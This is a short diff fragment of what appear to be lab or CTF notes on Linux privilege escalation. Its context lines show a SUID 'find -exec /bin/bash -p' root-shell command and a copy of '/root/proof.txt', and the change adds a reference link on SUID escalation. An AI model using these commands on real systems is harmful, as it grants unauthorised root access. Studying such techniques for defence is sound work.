@@ -80,3 +80,5 @@ find /tmp/a.txt -exec "/bin/bash" -p \;
 
 cp /root/proof.txt /tmp/a.txt
 ```
+
+https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620
